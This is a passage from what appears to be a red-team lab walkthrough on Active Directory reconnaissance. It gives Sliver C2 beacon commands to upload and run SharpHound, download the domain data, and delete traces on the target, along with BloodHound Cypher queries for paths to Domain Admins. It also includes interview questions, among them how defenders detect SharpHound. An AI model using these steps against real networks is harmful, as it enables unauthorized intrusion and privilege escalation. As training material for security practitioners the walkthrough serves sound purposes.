# Start BloodHound GUI
bloodhound

# Login with:
# URL: bolt://localhost:7687
# Username: neo4j
# Password: bloodhound
```

---

# PART 20: Running SharpHound {#part-20-running-sharphound}

## Step 1: Transfer SharpHound to Target

You need to get SharpHound.exe onto the compromised machine. Using Sliver:

```bash
# In Sliver console, with your beacon active:

# Upload SharpHound to the target
sliver (BEACON) > upload /opt/SharpHound/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe

# Verify it uploaded
sliver (BEACON) > ls C:\\Windows\\Temp\\SharpHound.exe
```

## Step 2: Run SharpHound

**Option A: Using execute-assembly (Recommended - stays in memory)**

If you have a .NET assembly version (SharpHound.exe):

```bash
# Run SharpHound from Sliver using execute-assembly
sliver (BEACON) > execute-assembly /opt/SharpHound/SharpHound.exe -c All
```

**Option B: Run directly (writes to disk)**

```bash
# Run SharpHound directly
sliver (BEACON) > shell

# In the shell:
C:\Windows\Temp\SharpHound.exe -c All --outputdirectory C:\Windows\Temp
```

**What you'll see:**

```
────────────────────────────────────────────────────────────────
SharpHound v1.1.0
────────────────────────────────────────────────────────────────
[*] Initializing SharpHound at 10:30 AM on 12/28/2024
[*] Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
[*] Initializing LDAP connection to DC01.ORSUBANK.LOCAL
[*] LDAP connection established
[*] Beginning LDAP collection
[*] Found 15 computers
[*] Found 25 users
[*] Found 50 groups
[*] Completed enumeration in 00:00:45
[*] Compressing data to C:\Windows\Temp\20241228103045_BloodHound.zip
[*] Finished!
────────────────────────────────────────────────────────────────
```

## Step 3: Download the Output File

```bash
# Find the file
sliver (BEACON) > ls C:\\Windows\\Temp\\

# Look for the .zip file with today's date
# Download it
sliver (BEACON) > download C:\\Windows\\Temp\\20241228103045_BloodHound.zip /tmp/bloodhound.zip

# Clean up (delete SharpHound from target)
sliver (BEACON) > rm C:\\Windows\\Temp\\SharpHound.exe
sliver (BEACON) > rm C:\\Windows\\Temp\\20241228103045_BloodHound.zip
```

---

# PART 21: Importing Data into BloodHound {#part-21-import}

## Step 1: Start BloodHound

If not already running:

```bash
# Make sure Neo4j is running
sudo neo4j start

# Start BloodHound
bloodhound
```

## Step 2: Upload the Data

1. In BloodHound GUI, click the **Upload Data** button (folder icon in top right)
2. Select your downloaded zip file (`/tmp/bloodhound.zip`)
3. Wait for import to complete
4. You'll see log messages as data is imported

**You should see:**

```
Uploading file...
Reading data...
Importing nodes...
Imported 15 computers
Imported 25 users  
Imported 50 groups
Importing edges...
Done!
```

## Step 3: Mark Owned Accounts

**Tell BloodHound which users you control:**

1. Search for your user: Type `vamsi.krishna` in search box
2. Right-click the user node
3. Select **Mark User as Owned**

**Now BloodHound knows your starting point!**

---

# PART 22: Finding Attack Paths {#part-22-finding-paths}

## Pre-Built Queries

BloodHound has powerful pre-built queries. Click the hamburger menu (three lines) to see them.

**Most Important Queries:**

| Query | What it finds |
|-------|---------------|
| "Find all Domain Admins" | Lists all Domain Admin accounts |
| "Find Shortest Paths to Domain Admins" | Attack paths from any user to DA |
| "Shortest Paths to Domain Admins from Owned Principals" | Paths from YOUR owned accounts to DA |
| "Find Computers where Domain Admins are logged in" | DA sessions to target |
| "Find Kerberoastable Users" | Accounts vulnerable to Kerberoasting |
| "Find AS-REP Roastable Users" | Accounts with pre-auth disabled |

## Example: Finding a Path

1. Click the three-line menu (top left)
2. Click **"Shortest Paths to Domain Admins from Owned Principals"**
3. BloodHound shows a graph visualization of attack paths

**Reading the Graph:**

- **Circles** = Users or Groups
- **Boxes** = Computers
- **Arrows** = Relationships (permissions)
- **Arrow Labels** = What the permission allows

```
Example Path Visualization:

[vamsi.krishna] --GenericAll--> [lakshmi.devi] --MemberOf--> [IT_Support]
                                                                   |
                                                              AdminTo
                                                                   |
                                                                   v
                                                               [WS02]
                                                                   |
                                                             HasSession
                                                                   |
                                                                   v
                                                            [pranavi] --MemberOf--> [Domain Admins]
```

---

# PART 23: Advanced Queries (Cypher) {#part-23-queries}

## Custom Cypher Queries

BloodHound uses Neo4j, which uses Cypher query language. You can write custom queries!

**Click the "Raw Query" button to enter custom queries.**

**Useful Custom Queries:**

```cypher
// Find all users with SPNs (Kerberoastable)
MATCH (u:User) WHERE u.hasspn=true RETURN u.name

// Find all computers where Domain Admins have sessions
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ ".*DOMAIN ADMINS.*"
RETURN c.name, u.name

// Find users who can DCSync
MATCH (u)-[:MemberOf|DCSync*1..]->(d:Domain)
RETURN u.name

// Find all users with GenericAll on other users
MATCH (u1:User)-[:GenericAll]->(u2:User)
RETURN u1.name AS Attacker, u2.name AS Target

// Find paths from owned users to Domain Admins (max 5 hops)
MATCH p=shortestPath((u:User {owned:true})-[*1..5]->(g:Group))
WHERE g.name =~ ".*DOMAIN ADMINS.*"
RETURN p

// Find computers where you have admin rights
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
RETURN c.name
```

---

# PART 24: Interview Questions {#part-24-interview}

## Top BloodHound/AD Enumeration Interview Questions

**Q1: What is BloodHound and why is it useful?**

**Answer:** BloodHound is an Active Directory reconnaissance tool that uses graph theory to find attack paths. It collects data about AD objects (users, groups, computers, ACLs) and visualizes relationships to identify privilege escalation paths. It's useful because it can find complex, multi-hop attack paths that humans would miss.

---

**Q2: What is SharpHound?**

**Answer:** SharpHound is the data collection component of BloodHound. It runs on a compromised Windows machine and queries Active Directory via LDAP to collect information about users, groups, computers, sessions, and ACLs. It outputs a zip file of JSON data that is imported into BloodHound for analysis.

---

**Q3: What collection methods does SharpHound support?**

**Answer:** SharpHound supports several collection methods:
- **Default**: Users, groups, computers, ACLs, trusts
- **Session**: Logged-on users (via NetSessionEnum)
- **LocalAdmin**: Local administrator relationships
- **All**: Complete collection of everything
- **Group**: Just group memberships
- **ACL**: Access Control Lists only

---

**Q4: Explain what GenericAll permission means and how an attacker can abuse it.**

**Answer:** GenericAll is a permission that grants full control over an AD object. If a user has GenericAll on another user, they can:
- Reset the target's password
- Modify any attribute on the target
- Take over the account completely

If the target is a privileged account (like a Domain Admin), this leads to privilege escalation.

---

**Q5: What is a "session" in BloodHound context and why is it valuable?**

**Answer:** A session represents where a user is currently logged in. BloodHound collects session data to find computers where high-privilege users (like Domain Admins) are logged in. This is valuable because:
1. If you gain admin access to that computer
2. You can dump credentials from memory (LSASS)
3. You get the Domain Admin's credentials/tickets

---

**Q6: How would you use BloodHound output to plan an attack?**

**Answer:**
1. Mark my compromised accounts as "Owned" in BloodHound
2. Run the query "Shortest Paths to Domain Admins from Owned Principals"
3. Analyze the path - what relationships need to be exploited?
4. For each step, determine the tool/technique needed:
   - GenericAll → Reset password or add to group
   - AdminTo → Lateral movement with admin creds
   - HasSession → Dump credentials from that computer
5. Execute the attack chain step by step

---

**Q7: What is the difference between BloodHound and PowerView?**

**Answer:**
- **BloodHound**: Visual attack path finder, uses graph database, finds complex multi-hop paths automatically
- **PowerView**: PowerShell enumeration toolkit, more manual, good for specific queries

BloodHound is better for overall attack planning. PowerView is better for targeted enumeration of specific objects.

---

**Q8: Can BloodHound detect Kerberoastable accounts? How?**

**Answer:** Yes. SharpHound collects the servicePrincipalName (SPN) attribute for all users. If a user account has an SPN, it can be Kerberoasted. BloodHound has a pre-built query "Find Kerberoastable Users" that shows all these accounts.

---

**Q9: What ports does SharpHound use?**

**Answer:**
- **Port 389** (LDAP) - Primary port for AD queries
- **Port 636** (LDAPS) - Encrypted LDAP
- **Port 445** (SMB) - For session enumeration
- **Port 135** (RPC) - For some local admin enumeration

---

**Q10: How can defenders detect SharpHound execution?**

**Answer:**
- Monitor for large LDAP queries requesting all objects
- Watch for enumeration of sensitive attributes (adminCount, servicePrincipalName)
- Detect NetSessionEnum calls across many computers
- Look for BloodHound artifacts in memory or on disk
- Use Windows Event IDs 4662 (Directory Service Access) and 4624 (Logon events)

---

# PART 25: Troubleshooting {#part-25-troubleshoot}

## Common Issues and Solutions

**Issue: SharpHound fails with "LDAP connection failed"**

```
Cause: Cannot reach Domain Controller
Fix:
- Check network connectivity: ping DC01
- Verify DNS resolution: nslookup DC01.orsubank.local
- Ensure firewall allows port 389
```

**Issue: Neo4j won't start**

```
Cause: Usually Java issues or port conflicts
Fix:
- Check Neo4j logs: sudo journalctl -u neo4j
- Verify port 7474/7687 not in use: sudo netstat -tlnp | grep 7474
- Restart Neo4j: sudo neo4j restart
```

**Issue: BloodHound shows "No data"**

```
Cause: Data not imported or database empty
Fix:
- Verify import completed successfully
- Click the refresh button
- Clear database and re-import: Database menu -> Clear Database
```

**Issue: "Access Denied" when running SharpHound**

```
Cause: Insufficient permissions
Fix:
- Any domain user should be able to run default collection
- LocalAdmin collection requires admin rights on targets
- Try running with just: SharpHound.exe -c Default
```

---

# PART 26: Next Steps {#part-26-next}

## What Comes After Enumeration?

Now that you've mapped the domain with BloodHound, you're ready for the next steps:

```
YOUR ATTACK PATH:
────────────────────────────────────────────────────────────────

[DONE] Initial Access (Walkthrough 00)
   |
   v
[DONE] Domain Enumeration (This Walkthrough)
   |
   v
[NEXT] Choose Your Attack Based on BloodHound Results:

If you found Kerberoastable users:
--> 02_kerberoasting.md

If you found AS-REP Roastable users:
--> 03_asrep_roasting.md

If you found GenericAll or other ACL abuses:
--> 05_acl_abuse.md

If you found admin access to a machine with DA session:
--> 04_credential_dumping.md

If you found a direct path with existing credentials:
--> 06_pass_the_hash.md or 06b_pass_the_ticket.md
```

## Summary: What You Learned

| Topic | Key Takeaway |
|-------|--------------|
| Networks | Computers connected together, sharing resources |
| Active Directory | Microsoft's central directory for user/computer management |
| Domain Controller | The server that runs AD - the crown jewel |
| LDAP | Protocol to query AD - how we enumerate |
| Kerberos | Authentication protocol with many attack vectors |
| Attack Paths | Chain of misconfigurations leading to Domain Admin |
| BloodHound | Tool that visualizes attack paths automatically |
| SharpHound | Data collector that queries AD and outputs JSON |
| Enumeration | First step after initial access - map everything! |

---

**CONTINUE YOUR JOURNEY:**

Based on what BloodHound found, pick your next attack:
- [02_kerberoasting.md](./02_kerberoasting.md) - If you found service accounts with SPNs
- [03_asrep_roasting.md](./03_asrep_roasting.md) - If you found accounts with pre-auth disabled
- [04_credential_dumping.md](./04_credential_dumping.md) - If you have admin access to a machine

---

*Document created for ORSUBANK Red Team Training Lab*
*For authorized educational use only*
